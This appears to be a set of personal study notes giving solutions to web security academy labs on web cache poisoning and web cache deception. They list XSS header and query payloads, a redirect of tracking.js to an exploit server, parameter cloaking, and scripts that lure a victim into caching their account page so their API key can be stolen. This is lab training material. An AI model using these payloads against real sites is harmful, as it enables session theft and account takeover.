## Web Cache Poisoning Vulnrabilities
- ==Web cache poisoning with an unkeyed header==
  Add a cache buster e.g. GET /?cb=food for testing purposes.
  Use an X-Forwarded-Host header to insert XSS payload. If you test by entering in a unique string, this string can be found in the Response.
  
  Use payload: 
```
X-Forwarded-Host: a."></script><img src=1 onerror='alert(document.cookie)'>"<script>
```  
 and send response until X-Cache: miss and Age: 0 to clear cache and poison cache
  Wait for victim to trigger and lab will solve
  
  Alternatively, can use exploit server: X-Forwarded-Host: exploit_id.exploit-server.net with file name: /resources/js/tracking.js and payload in Body: alert(document.cookie) 
- ==Web cache poisoning with an unkeyed cookie==
  Use cache buster.
  Cookie has a value that gets injected into the DOM. Add payload:
   Cookie: session=9MUecySfMMeTHnBIaf34grAWU5mWaGdM; fehost="}\</script>\<img src=1 onerror='alert(1)'> 
   
   Alternative payload: fehost=someString"-alert(1)-"someString
- ==Web cache poisoning with multiple headers==
  The endpoint that should be poisoned is:/resources/js/tracking.js
  Although the user visits the home page, this endpoint is called when the user visits the homepage. 
  
  Add these headers: 
  X-Forwarded-Host: exploit_id.exploit-server.net
  X-Forwarded-Scheme: com
  
  The X-Forwarded-Scheme value should be anything but https which will return a redirection 302 response to the URL specified in the X-Forwarded-Host (+ the endpoint path specified in the GET request)
  
  Poison the cache with the following:
  GET /resources/js/tracking.js HTTP/2
  Host: lab_id.web-security-academy.net
  X-Forwarded-Host: exploit_id.exploit-server.net
  X-Forwarded-Scheme: com
- ==Targeted web cache poisoning using an unknown header== 
  Post a comment on a blog post: \<img src="https://exploit-id.exploit-server.net" />
  View access log to get the User-agent of the victim, and paste this User Agent in the response, e.g.:
  User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
  
  Add X-Host: exploit_id.exploit-server.net header underneath the Host header. Param Miner didn't work and didn't reveal the X-Host header, only origin and via. 
  Change file path in exploit server to /resources/js/tracking.js and payload body to alert(document.cookie)
  Poison the queue.
- ==Web cache poisoning via an unkeyed query string==
  Cache buster can be added using Origin header
```
GET /?food='/><script>alert(1)</script> 
```
- ==[[04_2 Cache implementation flaws#Unkeyed query string|(Web cache poisoning via an unkeyed query parameter)]]==
```  
GET /?utm_content=%27/><script>alert(1)</script>
```
- ==Parameter cloaking==
  There is a js file that takes in a callback function as a parameter. Parameter cloakiing is possible through the use of ampersand and semicolon. The parameter after the ampersand will be ignored by the caching algorithm, but the back-end will identify it as a parameter. The parameter after the semicolon is also a valid parameter. If there are duplicate parameters, Ruby on Rails will take the last one as the valid one. Hence, setting the parameter name as callback, it is possible to pass alert(1).
  The website excludes utm_content parameter from the cache key, meaning that it will still cache for /js/geolocate.js?callback=setCountryCookie
  
  Use the payload: 
```
GET /js/geolocate.js?callback=setCountryCookie&utm_content=food;callback=alert(1)
```
- ==Web cache poisoning via a fat GET request==
  Poison this request GET /js/geolocate.js?callback=setCountryCookie HTTP/2 by adding a body callback=alert(1) 
- ==URL normalization==
  Try a random endpoint and see that the input is reflected in the DOM, e.g.: 
  \<p>Not Found: /food\</p>
  
  Craft a GET request, closing the p tag and injecting a script tag:
  GET /\</p>\<script>alert()\</script>\<p>
  
  Poison the queue and deliver link to victim.

  ## Web Cache Deception Vulnerabilities
  - ==Exploiting path delimiters for web cache deception==
   In Burp Intruder send GET /my-account[payload]wcd.js with delimiter payloads added and Payload encoding turned offin the Payloads panel
   Deliver \<script>
   document.location="https://lab_id.web-security-academy.net/my-account;wcd.js"
   \</script>
   to the victim then access the same web page and endpoint to get carlos' API
  - ==Exploiting origin server normalization for web cache deception==
   /resources/js/tracking.js is cacheable but the other pages are not. Running Intruder shows that the % character causes a server error, which means it is decoded in the server. Make a payload that contains path traversal with .js so that it will be cached but resolve by server to serve my-account
   Deliver \<script>
   document.location="https://lab_id.web-security-academy.net/resources/js/tracking.js/..%2f..%2f..%2fmy-account"
   \</script>
   - ==Exploiting cache server normalization for web cache deception==
   Use Intruder and delimiter list to find out which delimiter the cache server and origin server will have a discrepancy for. 
   Craft an exploit payload so that the response will be cached but the server will still resolve it as the /my-account endpoint
   
   \<script>
   document.location="https://lab_id.web-security-academy.net/my-account%23%2f..%2fresources/js/tracking.js"
   \</script>
   